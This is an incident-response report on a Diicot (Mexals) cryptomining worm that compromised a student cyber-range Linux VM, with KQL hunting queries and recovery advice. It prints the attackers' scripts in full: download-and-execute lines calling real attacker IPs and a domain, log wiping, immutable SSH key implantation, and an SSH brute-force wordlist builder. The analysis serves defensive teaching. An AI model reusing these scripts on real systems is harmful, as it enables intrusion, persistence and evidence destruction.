# Diicot (aka Mexals) Cryptominer Worm Analysis | Full-System Linux Compromise

---

## Report Information

- **Analyst:** Justin Soflin  
- **Date Completed:** Feb. 14, 2026  
- **Environment Investigated:** Cyber Range at LOG(N) Pacific
- **Malware Campaign Cluster:** Diicot (fka Mexals)
- **Payload Type:** Cryptomining Worm
- **Hosts Investigated:**  
  - `linux-programmatic-fix-michael`  
  - `linuxprogrammaticpabon`  
- **User Context:** root | Unauthorized miner installation & persistence  
- **Tools & Data Sources:** Microsoft Defender for Endpoint, Log Analytics Workspaces, KQL (Kusto Query Language), Linux audit logs  
- **Scope:** Full-System Linux compromise, system-level execution, persistence analysis, malware delivery chain reconstruction, log tampering assessment, post compromise 

---

## Table of Contents

- [Executive Summary](#executive-summary)
- [Investigation](#investigation)
  - [Initial Detection: Malware or PUA Observed](#initial-detection-malware-or-pua-observed)
  - [Authentication Context and Lab Configuration](#authentication-context-and-lab-configuration)
  - [Malicious Binary Download Detected](#malicious-binary-download-detected)
  - [Multiple Download Methods Observed](#multiple-download-methods-observed)
  - [Binary Relocation and Renaming](#binary-relocation-and-renaming)
  - [Persistence via /etc/init.d](#persistence-via-etcinitd)
  - [Log Tampering via cat /dev/null](#log-tampering-via-cat-devnull)
  - [SSH Key Implantation](#ssh-key-implantation)
  - [Malware Validation and Classification](#malware-validation-and-classification)
- [Recommended Actions](#recommended-actions)
- [Conclusion](#conclusion)

---

## Executive Summary

The student Linux virtual machine `linux-programmatic-fix-michael` was compromised by an automated cryptocurrency mining malware campaign. The investigation was initiated following a Microsoft Defender for Endpoint alert indicating **Malware or  PUA (Potentially Unwanted Application)** Observed.

This incident occurred during an active **student lab exercise** in which the **root account password was intentionally set to `root`** to generate alerts during Tenable vulnerability scanning exercises. While expected in a controlled instructional environment, this configuration significantly weakened the system’s security posture and exposed the VM to real-world internet scanning and brute-force activity.

Telemetry confirms that an external actor successfully authenticated as `root`, downloaded and executed a malicious ELF binary, established persistence using legacy init scripts, renamed system utilities to evade detection, implanted SSH keys for long-term access, and deliberately destroyed forensic artifacts.

VirusTotal analysis of the recovered binary returned a **46 / 63 detection score**, classifying the file as a **Trojan**, confirming the activity was malicious and not the result of student experimentation or administrative automation.

---

# Investigation

### Initial Detection: Malware or PUA Observed in MDE

- MDE generates alert **Malware or PUA** activity on Linux host
- Alert correlated with suspicious processes occurring under `root`

<Br>

<img width="1280" height="648" alt="image" src="https://github.com/user-attachments/assets/23305203-e6f9-4434-918b-dd3c6c2dceb1" /> <br>

<br>

- MDE mapped a lengthy Process Tree, highlighting several suspicious processes:
   - Suspicious file dropped and launched
   - Suspicious shell command execution
   - Suspicious file or content ingress
   - Executable permission added to file or directory
   - Suspicious shell script launched
 
    <br>
   
- Along with potentially suspicious commands:
   - `wget` (Remote file download)
   - `curl` (Payload retrieval / C2 communication)
   - `chmod` (Permission modification for execution)
   - `cron` (Persistence via scheduled task, Linux scheduler)
   - `dash` (Lightweight shell used to execute scripts)
 
     <Br>

<img width="1280" height="646" alt="image" src="https://github.com/user-attachments/assets/030f8102-196a-40a7-86d7-a291bb89e4e5" />

<br>
  
---

### First Look Into Compromised Device

- Multiple reconiassance commands observed:
   - `la -la` Lists files/directories, including hidden ones (-a) with permissions (-l)
   - `who` Shows logged-in users
   - `cat /etc/resolv.conf` reads contents of /resolv.conf, typically contains DNS resolver configuration
   - `uptime` Displays how long the system has been running, number of users, load averages
   - `cd /etc` hanges the working directory to /etc

  <Br>
  
```kql
DeviceProcessEvents
| where DeviceName contains "fix-michael"
| where TimeGenerated >= ago(15d)
| order by TimeGenerated desc
| project TimeGenerated, AccountName, DeviceName, FileName, FolderPath, InitiatingProcessParentFileName, ProcessCommandLine
```

<img width="1144" height="326" alt="image" src="https://github.com/user-attachments/assets/d4180bbb-a5bd-4228-849a-da6448cde0a9" />

<br>

- What this means:
   - A persistent root-level session existed for ~5 days
   - That session repeatedly executed _estimated thousands of_ short-lived binaries
   - Filenames were randomized: `owqtmtieus`, `nwvslhwzwf`, etc.
   - Each binary executs for ~5 seconds before writing a new file
   - Activity pattern indicates automation, not human typing
   - Behavior is inconsistent with legitimate admin activity
 
    <Br>

- Files are located at '/usr/bin'
   - Only root can write to `/usr/bin`
   - Regular users cannot create files there
   - It’s considered a protected system directory
   - **`/usr/bin/` survives reboots**
 
  <br>

<img width="734" height="391" alt="image" src="https://github.com/user-attachments/assets/5684e222-a1e2-49c1-9704-25df36ce4211" />

<br>

 - Even though the files are presumably the same:
   - Each SHA256 hash is different
   - File sizes change slightly
   - Malware could modify itself purposely to avoid detection
   - Things like wallet addresses and ports could change within the file

<img width="1184" height="470" alt="image" src="https://github.com/user-attachments/assets/5deb645c-ed6c-4d8c-bbab-548841fd69e9" />

- Session ID `79416`
   - Value is derived from Linux and added by MDE
   - Correlates sessions to file name randomization
   - Logs show **over 15,000** commands linking to the same session for this VM
   - All originating from the same ParentFile `ygljglkjgfg0`
   - Each command is within milliseconds of each other

```
Linux kernel:  creates session 79416
        ↓
MDE sensor:   observes + labels it
        ↓
Log Analytics: stores & exposes it
```

---

### Authentication Context and Lab Configuration

At the time of compromise, the VM was actively being used for a **student lab exercise** designed to trigger insecure authentication practices for Tenable scans.

<br>

<img width="764" height="212" alt="image" src="https://github.com/user-attachments/assets/88779564-9ad3-4531-9fcd-cd627f7525d0" />

<br>

Lab configuration included:
- SSH access intentionally exposed  
- **Root password set to `root`**  
- Expected vulnerability generation in Tenable for followup remediation

<br>

---

### Student changes Root password | AHTKzAEv

- Student begins the lab, changing root password to _root_
   - _2026-01-30T`13:50`:32.826013Z_ — `/etc/shadow` edited by _Labuser_ via root (student password change)
   - _2026-01-30T`14:02`:04.257228Z_ ~12 minutes later, first suspicious file `/var/tmp/AHTKzAEv` is created
   - `AHTKzAEv` and its siblings appear in `/var/tmp` or `/usr/bin` with gibberish names, running as root processes

```kql
DeviceFileEvents
| where DeviceName contains "fix-michael"
| where TimeGenerated >= ago(15d)
| order by TimeGenerated asc
| project TimeGenerated, ActionType, DeviceName, FileName, FolderPath, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessParentFileName
```

<br>

<img width="1103" height="283" alt="image" src="https://github.com/user-attachments/assets/6ac566a0-a285-4a43-b403-a1ee36c917fc" /> <br>

<Br>

| Timestamp       | File / Action                         | Notes                                                                                      |
|-----------------|--------------------------------------|--------------------------------------------------------------------------------------------|
| 2:02:04         | `AHTKzAEv` and multiple `x.sh` files | Initial payload and helper scripts                                                         |
| 2:02:04.957     | `retea` in `/dev/shm`                 | `/dev/shm` is shared memory; malware sometimes drops helpers here for fast execution or stealth (RAM-only execution) |
| 2:02:05         | `/root/.ssh/authorized_keys` updated | Allows persistence via SSH (attacker can log in without a password)                        |
| 2:02:05         | `/etc/passwd` and `/etc/shadow` updated | Confirms attacker escalated privileges / added backdoors |

<br>

- Repeated FileCreated / FileDeleted events for `x.sh` and `AHTKzAEv`
   - This pattern suggests execution loops: run the script → collect data → delete temporary files → drop new scripts to continue
   - Deleting files is often to avoid forensic detection

     <Br>
     
```
/var/tmp/AHTKzAEv          <- the malicious binary
  └─ ygljglkjgfg0          <- child process / script spawned by AHTKzAEv
       └─ owqtmtieus       <- reconnaissance or mining scripts spawned by ygljglkjgfg0

```

<br>

**109.206.236.18 Beaconing** 
- Compromised VM initiating outbound connection to attacker-controlled server

  <br>

<img width="806" height="207" alt="image" src="https://github.com/user-attachments/assets/049e3c99-f6de-4ae7-8b63-d7eaa04674b7" />

<br>

<img width="1245" height="802" alt="image" src="https://github.com/user-attachments/assets/40f22064-6942-4bd7-b04e-ab5facf4a3ed" />

<br>

---

### Malware Injects Password Hash for Root

- **Command:** _usermod -p ********** root_
   - `usermod` → Linux command used to modify a user account
   - `-p **********` → Sets the user’s password hash directly (not plaintext)
   - `root` → The username being modified
  
 <Br>

 <img width="1151" height="344" alt="image" src="https://github.com/user-attachments/assets/58e42a90-b7db-41a8-b939-cc96f061c592" />

<br>

- `**********` is the masked hash, so you don’t see it
- By replacing or adding a root hash with its own, malware creates a backdoor
- Student is still able to log in/continue session
- Student won't get booted off or have any indication compromise has happened
- This takes place just **12 minutes** after student's root password change
- Student wouldn't have had ample time to complete lab before device is compromised

 <br>

**Students are instructed to destroy VM asap when lab is finished** to avoid compromise
<img width="788" height="386" alt="image" src="https://github.com/user-attachments/assets/7adfaba9-8836-42cf-a495-8014fff03e91" />

<br>

---

### diicot

- `kuak` and `diicot` created in _tmp_ folder shortly after `AHTKzAEv`
   - both files ran long code meant to terminate any existing miners
<img width="1174" height="342" alt="image" src="https://github.com/user-attachments/assets/2161b4c2-df21-4a20-ba11-47370b34a5cc" />

<br>
<br>
<img width="1460" height="1131" alt="image" src="https://github.com/user-attachments/assets/6d3e540c-35b3-4ef7-8565-73a4daf6affc" />

**Full command with annotations**
```bash
# --- Cleanup old folders & recreate working directory ---
rm -rf /var/tmp/Documents /tmp/cache             # Remove old malware staging directories and temp files
mkdir -p /var/tmp/Documents 2>&1                 # Recreate working directory

# --- Remove cron jobs & SSH keys for stealth/control ---
crontab -r                                       # Remove all user cron jobs
chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1   # Remove immutable flags from SSH keys (so they can delete/replace)

# --- Prep malware files ---
cd /var/tmp
chattr -iae /var/tmp/Documents/.diicot          # Remove immutable flags from previously staged .diicot
mv /var/tmp/diicot /var/tmp/Documents/.diicot  # Move new diicot payload to working dir
mv /var/tmp/kuak /var/tmp/Documents/kuak        # Move kuak shared library to working dir

# --- Kill competing miners or Java apps ---
pkill Opera
pkill cnrig
pkill java
killall java
pkill xmrig
killall cnrig
killall xmrig

# --- Make all files in working dir executable ---
cd /var/tmp/Documents
chmod +x .*                                     # Recursive executable flags
./.diicot >/dev/null 2>&1 & disown             # Run diicot in background silently

# --- Cleanup shell history for stealth ---
history -c
rm -rf .bash_history ~/.bash_history

# --- Prepare & execute cache payload ---
cd /tmp/
chmod +x cache
./cache >/dev/null 2>&1 & disown
history -c
rm -rf .bash_history ~/.bash_history
```

- What this script is doing:
   - Terminating any potential competing malware/miners to free up CPU/resources
   - Setting up its working directory
   - Moving payload files into a hidden location
   - Making them executable
   - Running them in the background
   - Wiping evidence
 
<br>

**SOURCE: DarkTrace blog** <Br>
<img width="643" height="583" alt="image" src="https://github.com/user-attachments/assets/d775f701-74fa-44bf-bda9-2ca113e9ff3b" /> <br>

<br>

---
## SSH Brute Force on Internal Subnet (10.1.0.0/24)

**Malware scans internal subnet `10.1.0.0/24`**
   - Malware probes IP addresses in the range of _(10.1.0.0–10.1.0.255)_
   - _Port 22 SSH_ → looking for servers that accept SSH connections
   -  If SSH is open, the malware tries common passwords for user accounts <br>
   <br>
   
**Password exerpt from _retea_ script**

```
root root
root rootroot
root root123
root root123456
root 123456
root 123
```

 <br>

```kql
 DeviceNetworkEvents
| where DeviceName contains "fix-michael"
| where TimeGenerated >= ago(15d)
| where RemotePort == "22" 
| project TimeGenerated, ActionType, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, Protocol, RemoteIP, RemoteIPType, RemotePort
| order by TimeGenerated asc
```

<br>

<img width="1096" height="307" alt="image" src="https://github.com/user-attachments/assets/6efd8585-e0dc-4120-967f-cf6c4eb6779b" />

<Br>

- Each attempt generates a _ConnectionRequest_ log, whether it succeeds or fails
- No _ConnectionSuccess_ was observed

**If it successfully logs in, it can restart the whole process:**
   - Install itself on the new host
   - Delete competing malware
   - Run miners (like xmrig or cnrig)
   - Hide traces (clear logs, remove bash history)

<br>

---

### Root Cron Persistence

<br>

- `cron` is a built-in Linux utility for scheduling tasks
   - these cron processes start at: `2026-01-30T14:04:23.447447Z`
   - and go on until: `2026-02-02T22:47:03.418251Z`
- these Cron tasks run _every minute_
- cron drops `.b4nd1d0` into `/var/tmp/`
- Executes hidden payload
- Rewrites cron to ensure it stays installed
- This illustrates post-compromise persistence

<img width="1175" height="342" alt="image" src="https://github.com/user-attachments/assets/42f58afa-b9c0-4b16-a493-319739ba0942" /> <br>

<br>

- many _tmp._ files in `/var/spool/cron/crontabs/` (like `tmp.RYF9JE` and `tmp.SHGiEW`) along with root crontab activity
- These are temporary cron files created when the malware manipulates the root crontab
- crontab writes to temp files first, then rename them into place
   - That explains the frequent FileCreated + FileRenamed events — the malware is adding a scheduled job

     <br>
     
### .b4nd1d0 
- a _leetspeak_ spelling of "Bandido" or "Bandit"
- Known Malware Associations
   - _.b4nd1d0_ has been observed in real Linux malware families in the wild
   - It’s typically a secondary payload, backdoor, or helper binary
   - Its consistent naming makes it easier for the malware’s cron scripts to find and execute it repeatedly

 <br>
 
<img width="1175" height="343" alt="image" src="https://github.com/user-attachments/assets/27adc996-b56a-4990-8b6d-688639596920" />

<br>

### Malicious Binary Download p.txt & r.txt

- `curl http://23DOT160DOT56DOT194/p.txt -o ygljglkjgfg0`
   - `p.txt` malicious **ELF binary** (named as _.txt_)
   - `ygljglkjgfg0` renamed executable copy
- also observed: `curl http://23.160.56.194/r.txt -o sdf3fslsdf15`
 
    <br>
   
<img width="1148" height="343" alt="image" src="https://github.com/user-attachments/assets/30eae789-719e-49e9-8338-21a71efeb701" />

<br> 

- malicious file output to `ygljglkjgfg0`
   - Downloaded via `curl` and `wget` from a remote host `23.160.56.194/p.txt`
   - First seen at `/usr/bin/ygljglkjgfg0` = persistent executable
   - Then copied to `/etc/init.d/ygljglkjgfg0` = run at boot
   - and `/etc/cron.hourly/gcc.sh` = run every hour or as scheduled
 
    <Br>

<img width="1186" height="129" alt="image" src="https://github.com/user-attachments/assets/92235bb2-534f-4b07-b581-e0ae091b650f" />

  <br>
  
- `ygljglkjgfg0` is the original parent file to spawn the many randomized file names from the start
- obfuscated file names (_`tdrbhhtkky`_, _`omicykvmml`_):
  - Avoid hash-based detections
  - Avoids filename-based detections
  - Makes IOC-based hunting harder
  - Prevents defenders from blocking a single file
- These are clones or secondary payloads:
   - Backdoors
   - Miner binaries
   - Remote control scripts
 
   <br>

<img width="1469" height="1026" alt="image" src="https://github.com/user-attachments/assets/048196ef-b444-4d7a-b47c-7378c44183f5" />

<Br>

**Crontab modification**
- The malware edits `/etc/crontab` to remove old references to `gcc.sh` and add a new entry:
   - `*/3 * * * * root /etc/cron.hourly/gcc.sh`
   - malware will now run every 3 minutes

   <br>

   <img width="608" height="366" alt="image" src="https://github.com/user-attachments/assets/69f4d00b-3769-4bf3-9c9d-f52963e6c1ab" />

   <br>
   
---

### p.txt Variants

- p.txt observations:
   - downloaded on two different devices
   - from same IP `23.160.56.194`
   - to the same file name `ygljglkjgfg`
   - on _1/27/2026_ and _2/2/2026_
   - both with the same file size `548616`
   - but with two different SHA256
 
<br>

<img width="1185" height="111" alt="image" src="https://github.com/user-attachments/assets/34ab995b-7b97-4eb8-9bc6-5828c76611c3" />

<br>
  
- Malware keep the same URL so all infected machines keep pulling the “latest version”
- FileType: Elf (Executable and Linkable Format) even though it's named .txt
   - Not actually a text file, but a compiled Linux binary
   - Name file _.txt_ to avoid suspicion
   - Download → Rename → Execute 

 **VirusTotal page for both SHA256 Hashes**    
<img width="1280" height="647" alt="image" src="https://github.com/user-attachments/assets/987eede9-ed10-45ce-b751-6016c6f32762" /> <br>

<img width="1280" height="644" alt="image" src="https://github.com/user-attachments/assets/37e734b4-a72d-4f33-ac52-817bbc5ea215" />

 <br>
 
- **Notes from VirusTotal:**  
  - Cryptocurrency mining  
  - Process termination of competing miners  
  - Persistence installation  
  - Log destruction  

<br>

---

### Binary Relocation and Renaming

**The attacker deliberately renamed trusted system binaries:**

```
mv /usr/bin/wget /usr/bin/good 
mv /bin/wget /bin/good
```  

- Allows continued payload delivery while bypassing detections

<Br>

<img width="2299" height="681" alt="image" src="https://github.com/user-attachments/assets/e48416ac-e04d-4418-b64e-c4ace68f1c18" /> <br>

<br>

<img width="656" height="1005" alt="image" src="https://github.com/user-attachments/assets/dac84ac5-56fe-4e2b-aed5-a539bfdcaf23" />


**Full command with annotations**
```bash
# --- Launch new bash shell to execute payload ---
bash -c '                                      # Execute entire malicious routine inside a subshell

# --- Identify writable directory (privilege-aware staging) ---
wdir="/bin"                                    # Default working directory
for i in "/bin" "/home" "/root" "/tmp" "/usr" "/etc"
do
    if [ -w $i ]                               # Check if directory is writable
    then
        wdir=$i                                # Use first writable directory found
        break
    fi
done
cd $wdir                                       # Change into writable directory

# --- Download & execute first-stage payload (p.txt) via curl ---
curl http://23.160.56.194/p.txt -o ygljglkjgfg0 # Download payload and save as randomized filename
chmod +x ygljglkjgfg0                           # Make file executable
./ygljglkjgfg0                                  # Execute payload

# --- Retry download using wget (redundancy) ---
wget http://23.160.56.194/p.txt -O ygljglkjgfg1 # Download same payload using wget
chmod +x ygljglkjgfg1
./ygljglkjgfg1

# --- Retry using renamed wget binary ("good") ---
good http://23.160.56.194/p.txt -O ygljglkjgfg2 # "good" is renamed wget (defense evasion)
chmod +x ygljglkjgfg2
./ygljglkjgfg2

sleep 2                                         # Brief delay between payload stages

# --- Download & execute second-stage payload (r.txt) ---
wget http://23.160.56.194/r.txt -O sdf3fslsdf13
chmod +x sdf3fslsdf13
./sdf3fslsdf13

# --- Retry via renamed wget ---
good http://23.160.56.194/r.txt -O sdf3fslsdf14
chmod +x sdf3fslsdf14
./sdf3fslsdf14

# --- Retry via curl ---
curl http://23.160.56.194/r.txt -o sdf3fslsdf15
chmod +x sdf3fslsdf15
./sdf3fslsdf15

sleep 2                                         # Additional delay for execution timing

# --- Rename system wget binary (defense evasion) ---
mv /usr/bin/wget /usr/bin/good                  # Rename wget to evade simple detections
mv /bin/wget /bin/good

# --- Anti-forensics: Clear command history ---
cat /dev/null >/root/.bash_history              # Wipe root bash history

# --- Anti-forensics: Wipe authentication & system logs ---
cat /dev/null > /var/log/wtmp                   # Clear login history
cat /dev/null > /var/log/btmp                   # Clear failed login attempts
cat /dev/null > /var/log/lastlog                # Clear last login records
cat /dev/null > /var/log/secure                 # Clear auth logs (RHEL/CentOS)
cat /dev/null > /var/log/boot.log               # Clear boot logs
cat /dev/null > /var/log/cron                   # Clear cron activity logs
cat /dev/null > /var/log/dmesg                  # Clear kernel ring buffer logs
cat /dev/null > /var/log/firewalld              # Clear firewall logs
cat /dev/null > /var/log/maillog                # Clear mail logs
cat /dev/null > /var/log/messages               # Clear general system messages
cat /dev/null > /var/log/spooler                # Clear print spool logs
cat /dev/null > /var/log/syslog                 # Clear syslog
cat /dev/null > /var/log/tallylog               # Clear login tracking counters
cat /dev/null > /var/log/yum.log                # Clear package manager logs
cat /dev/null >/root/.bash_history              # Ensure history cleared again

# --- Check for gcc process PID file (possible miner persistence check) ---
ls -la /var/run/gcc.pid                         # Check for existing gcc-named process (common miner disguise)

exit $?                                         # Exit script returning last command status
'
```

---

### Persistence via /etc/init.d

**`ygljglkjgfg0` is created/copied to _/etc/init.d/_** <br>
- `/etc/init.d/` is used for startup services on Linux systems
   - That means it would run automatically at boot
- This confirms **intentional long-term persistence**. 

<Br>

```kql
DeviceFileEvents  
| where DeviceName == "linux-programmatic-fix-michael"  
| where FolderPath startswith "/etc/init.d"  
| project TimeGenerated, FileName, FolderPath, InitiatingProcessCommandLine
| order by TimeGenerated desc  
```

<br>

<img width="2017" height="430" alt="image" src="https://github.com/user-attachments/assets/bd2124e1-4894-453b-aeaf-3438736562fe" />

<br>

---

### SSH Key Implantation

**A persistent SSH backdoor was implanted:**

<br>

```
chattr -ia ~/.ssh/authorized_keys  
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ..." > ~/.ssh/authorized_keys  
chattr +ai ~/.ssh/authorized_keys  
```

<br>

_01/30_, day of compromise, actor set root password hash <br>
_02/02_, actor adds their SSH public key to root's authorized_keys and makes the file immutable

**Why do both?**
   - Password-based backdoors can be changed or removed by system updates, resets, or admins
   - Implantation ensures they can always log in via key, even if root password is changed later
   - SSH key login may not generate password login attempts
   - `chattr +ai` prevents even root from editing/deleting the key without first removing the immutable attribute
   - Trivial fix for skilled linux users with root access
   - Otherwise can delay remediation and prolong system infection 
     
<br>

<img width="1670" height="1059" alt="image" src="https://github.com/user-attachments/assets/d1937763-4c15-40fd-b980-c44666213c08" />

**Full command with annotations**
```bash
# --- Stage 1: Execute cleanup script ---
chmod +x clean.sh                # Make clean.sh executable
sh clean.sh                      # Run cleanup actions (likely remove temp files / old malware traces)
rm -rf clean.sh                  # Delete script to remove evidence

# --- Stage 2: Execute setup script ---
chmod +x setup.sh                # Make setup.sh executable
sh setup.sh                      # Run setup actions (likely prep malware staging directories)
rm -rf setup.sh                  # Delete script to remove evidence

# --- Stage 3: Create staging directory ---
mkdir -p *******                  # Create folder for malware payloads or data

# --- Stage 4: Prepare SSH for persistence ---
chattr -ia ~/.ssh/authorized_keys # Remove immutable/append-only flags so file can be overwritten

# --- Stage 5: Overwrite SSH authorized keys with attacker key ---
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... rsa-key-20230629" > ~/.ssh/authorized_keys

# --- Stage 6: Protect attacker key from removal ---
chattr +ai ~/.ssh/authorized_keys # Set immutable and append-only flags to prevent deletion or modification

# --- Stage 7: System reconnaissance / reporting ---
uname -a                          # Output system info (likely sent to attacker)
echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A" # Hex for "auth_ok" (signal success to C2)
```

<br>

**What this script is doing:**
   - Malware prepares environment (cleanup & setup scripts)
   - Staging directory created for payloads
   - SSH persistence established with attacker key
   - SSH key is protected from modification or removal
   - System info is exposed
   - Signal sent to confirm successful compromise
   - Student/root password changes are bypassed by attacker key

**Outcome:**
   - Full passwordless SSH access for attacker
   - Persistent backdoor hard to remove
   - Attacker added their own SSH key, alowing a silent login
   - depending on how system logs SSH, standard login record might not generate
   - This explains how the student wasn't booted: their account wasn’t actively interrupted

<br>

---

### Crypto Mining Worm retea

**Script reads in part:**

```bash
if key == [hardcoded string]
    echo ""
else
    echo Logged with successfully.
    rm -rf .retea
```

**Malware registration check**
- If the key matches → do nothing
- If the key does NOT match → print _'login successful'_ and delete `.retea` 

<br>

<img width="1152" height="343" alt="image" src="https://github.com/user-attachments/assets/27c03eb7-950e-42d1-81a9-6bdbaea4f2ab" />

<br>

```bash
# ================================
# Stage 1 — Key Check / Execution Gate
# ================================

./retea -c '
key=$1
user=$2

# Hardcoded access key check
if [[ $key == "KOFVwMxV7k7XjP7fwXPY6Cmp16vf8EnL54650LjYb6WYBtuSs3Zd1Ncr3SrpvnAU" ]]
then
    echo -e ""          # If correct key → continue silently
else
    echo Logged with successfully.

    # --- Kill competitors & remove traces ---
    rm -rf .retea
    crontab -r
    pkill xrx haiduc blacku xMEu Opera cnrig java xmrig
    killall java cnrig xmrig

    # --- Remove competing miners & staging folders ---
    cd /var/tmp
    rm -rf /dev/shm/.x /var/tmp/.update-logs /var/tmp/Documents /tmp/.tmp
    mkdir /tmp/.tmp
    rm -rf xmrig .diicot .black Opera xmrig.1

    # --- Download payload from fallback domains ---
    wget -q dinpasiune.com/payload \
      || curl -O -s -L dinpasiune.com/payload \
      || wget 85.31.47.99/payload \
      || curl -O -s -L 85.31.47.99/payload

    chmod +x *
    ./payload >/dev/null 2>&1 & disown

    # --- Clear history for stealth ---
    history -c
    rm -rf .bash_history ~/.bash_history

    # --- Execute secondary hidden component ---
    chmod +x .teaca
    ./.teaca >/dev/null 2>&1
    history -c
    rm -rf .bash_history ~/.bash_history
fi


# ================================
# Stage 2 — System Tuning for Mining
# ================================

rm -rf /etc/sysctl.conf
echo "fs.file-max = 2097152" > /etc/sysctl.conf
sysctl -p

ulimit -Hn
ulimit -n 99999 -u 999999


# ================================
# Stage 3 — Setup Hidden Working Directory
# ================================

cd /dev/shm
mkdir /dev/shm/.x
mv network .x/
cd .x

rm -rf retea ips iptemp iplist pass


# ================================
# Stage 4 — Generate Credential Wordlist
# ================================

# Extract all valid login users
useri=$(cat /etc/passwd | grep -v nologin | grep -v false | grep -v sync | grep -v halt | grep -v shutdown | cut -d: -f1)

echo $useri > .usrs

# Build brute-force password list
for us in $(cat .usrs); do
    printf "$us $us\n" >> pass
    printf "$us ${us}123\n" >> pass
    printf "$us 123456\n" >> pass
    printf "$us password\n" >> pass
    printf "$us 1qaz@WSX\n" >> pass
    printf "$us Huawei@123\n" >> pass
    printf "$us qaz123!@#\n" >> pass
    # (Many additional weak combos omitted here for brevity)
done


# ================================
# Stage 5 — Shuffle Target IP List
# ================================

cat bios.txt | sort -R | uniq > i
cat i > bios.txt


# ================================
# Stage 6 — Lateral Movement
# ================================

./network "
    # Remove old staging folders
    rm -rf /var/tmp/Documents /tmp/cache
    mkdir /var/tmp/Documents

    # Remove persistence & SSH restrictions
    crontab -r
    chattr -iae ~/.ssh/authorized_keys

    # Kill competing miners
    pkill Opera cnrig java xmrig
    killall java cnrig xmrig

    # Deploy miner payload
    mv /var/tmp/diicot /var/tmp/Documents/.diicot
    mv /var/tmp/kuak /var/tmp/Documents/kuak

    cd /var/tmp/Documents
    chmod +x .*
    /var/tmp/Documents/.diicot >/dev/null 2>&1 & disown

    # Execute cache payload
    cd /tmp/
    chmod +x cache
    ./cache >/dev/null 2>&1 & disown

    # Clear history
    history -c
    rm -rf .bash_history ~/.bash_history
"


# ================================
# Stage 7 — Self Cleanup
# ================================

function Miner {
    rm -rf /dev/shm/retea /dev/shm/.magic
    rm -rf /dev/shm/.x ~/retea /tmp/kuak /tmp/diicot /tmp/.diicot
    rm -rf ~/.bash_history
    history -c
}

Miner
'
```

<br>


```bash
    # --- Download payload from fallback domains ---
    wget -q dinpasiune.com/payload \
      || curl -O -s -L dinpasiune.com/payload \
      || wget 85.31.47.99/payload \
      || curl -O -s -L 85.31.47.99/payload
```

<br>

<img width="1264" height="644" alt="image" src="https://github.com/user-attachments/assets/a1ddd61f-0cfc-4b63-86ef-744a87475176"> 
  
  <br>

---

## Cloud Provider Disables Azure VNet

**Cyber Range SOC was previously targeted by this malware** in _May 2025_

- Email recieved: **Notice of Microsoft Azure Subscription Termination** from the **Microsoft Azure Safeguard Team**
- Case _SIR21183209_
- even though malware was not deployed by us, it still originates from our environment and is therefore our responsibility
- Microsoft temporarily **disabled Cyber Range VNet 2**

 <br>

<img width="1772" height="1057" alt="image" src="https://github.com/user-attachments/assets/0b716d64-9008-4f0e-b1ab-8562b253104d" />

 <br>
 <Br>

<img width="1919" height="980" alt="image" src="https://github.com/user-attachments/assets/38c3fc55-6b59-47c4-b750-b32886a0d29a" />

 <br>
 <Br>

<img width="1957" height="1055" alt="image" src="https://github.com/user-attachments/assets/4c4f3dff-2186-42ee-8672-adaf360bdfff" />

<br>
<br>

## Cyber Range Engineer responds

- New outbound rules for _SSH_ and common crypto miner ports denied
   - Ports 22, 3333, 4444, 5555, etc.
- VMs can continue Root Labs without scanning outbound IPs, even if compromised

  <br>

  <img width="1394" height="642" alt="image" src="https://github.com/user-attachments/assets/81ab7bbc-837a-4572-9206-2061f6d63094" />

<Br>

<img width="1120" height="646" alt="image" src="https://github.com/user-attachments/assets/7cc46184-a833-44d7-b9be-7ccb5103f29b" />

<br>

**Cyber Range targeted by malware again** _Jan. 30, 2026_
- Compromised VM successfully scanned subnet 10.1.0.0/24:22
   - No outbound scans observed

---

## Recommended Actions

### Immediate Recovery

- Redeploy affected virtual machines  
- Remove unauthorized init scripts  
- Rotate all credentials and SSH keys  
- Rebuild systems from trusted images  

### Monitoring Improvements

- Alert on writes to `/etc/init.d`  
- Monitor renaming of binaries in `/bin` and `/usr/bin`  
- Detect log truncation behavior  
- Alert on modifications to `authorized_keys`  
- Flag repeated download attempts from single external IPs  

---

## Conclusion

This incident represents a **complete Linux system compromise** performed by automated malware exploiting weak authentication during a student lab exercise. While the insecure configuration was intentional for instructional purposes, it created conditions identical to real-world attack surfaces.

Microsoft Defender for Endpoint successfully detected the malicious activity, enabling investigation and confirmation of compromise. This case highlights how quickly exposed Linux systems can be compromised and reinforces the importance of monitoring persistence mechanisms, binary integrity, and log tampering — even in educational or non-production environments.
